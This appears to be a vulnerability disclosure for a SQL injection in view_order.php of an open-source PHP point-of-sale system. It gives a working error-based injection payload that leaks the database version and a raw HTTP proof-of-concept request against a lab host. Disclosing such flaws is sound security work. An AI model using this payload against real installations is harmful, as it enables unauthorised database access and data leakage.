# SQLi-6 

# Vulnerability Description

The best-pos-management-system-php in PHP Free Source Code (It is an open source project from [www.sourcecodester.com](www.sourcecodester.com)) has SQL injection vulnerabilities, which can lead to database information leakage.

1. BUG_Author:
2. vendors: [https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html](https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html)
3. The program is built using the PHP 7.3.4nts version;
4. Vulnerability location: /view_order.php

[+] Payload:

```http
id=1%20OR%20(SELECT%204743%20FROM(SELECT%20COUNT(*),CONCAT('~',version(),'~',FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)
```

POC：

```http
GET http://10.0.10.39/kruxton/view_order.php?id=1 HTTP/1.1
Host: 10.0.10.39
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=6cco6p8q0cm6uim065rcoisf3v
Upgrade-Insecure-Requests: 1


```

## How to verify

Build the vulnerability environment according to the steps provided by the source code author and execute the poc provided above：
![image-20240313153721-dnpqayy](https://github.com/ycxdzj/CVE_Hunter/assets/159221768/7659c8b1-f8a8-4fcc-879f-269429faf657)

